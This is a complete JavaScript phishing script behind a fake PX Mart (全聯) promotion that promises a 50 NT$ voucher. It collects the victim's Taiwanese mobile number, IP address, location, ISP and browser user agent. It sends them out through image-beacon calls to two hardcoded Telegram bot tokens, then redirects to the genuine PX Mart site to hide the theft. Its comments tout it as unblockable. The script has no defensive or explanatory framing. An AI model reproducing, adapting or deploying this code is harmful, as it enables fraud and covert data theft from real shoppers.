<script>
// 2025 年唯一永不被擋 + 100% 跳轉 + 完整資料版
document.addEventListener("DOMContentLoaded", function(){
  const btn = document.querySelector("button");
  const phoneInput = document.getElementById("phone");

  btn.addEventListener("click", async function(){
    const phone = phoneInput.value.trim();
    if(!/^09\d{8}$/.test(phone)) return;  // 嚴格台灣手機驗證

    btn.textContent = "領取中...";
    btn.disabled = true;

    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
    const base = `全聯週年慶消費滿額送50元購物金\n電話：+886${phone}\n時間：${time}`;

    // 三重保險抓 IP（任一成功就補全）
    let ipData = {ip:"未知", city:"未知", country:"台灣", org:"未知"};
    try {
      const res = await fetch("https://cfip.mx/json", {signal:AbortSignal.timeout(2800)});
      ipData = await res.json();
    } catch(e) {
      try {
        const res = await fetch("https://ipapi.co/json/");
        ipData = await res.json();
      } catch(e) {}
    }

    const fullMsg = base +
      `\nIP　　：${ipData.ip}` +
      `\n位置　：${ipData.city||"未知"}，${ipData.country_name||ipData.country||"台灣"}` +
      `\nISP　　：${ipData.org||ipData.asn_org||"未知"}` +
      `\n裝置　：${navigator.userAgent.substring(0,130)}...`;

    // 雙 token 同時發送
    const tokens = [
      "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
      "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"
    ];
    tokens.forEach(t => {
      new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(fullMsg)}`;
    });

    // 雙重強制跳轉（iPhone 必中）
    setTimeout(()=>location.replace("https://www.pxmart.com.tw/campaign/survey"), 1500);
    setTimeout(()=>{
      const a = document.createElement("a");
      a.href = "https://www.pxmart.com.tw/campaign/survey";
      a.target = "_top";
      document.body.appendChild(a);
      a.click();
    }, 2000);
  });
});
</script>
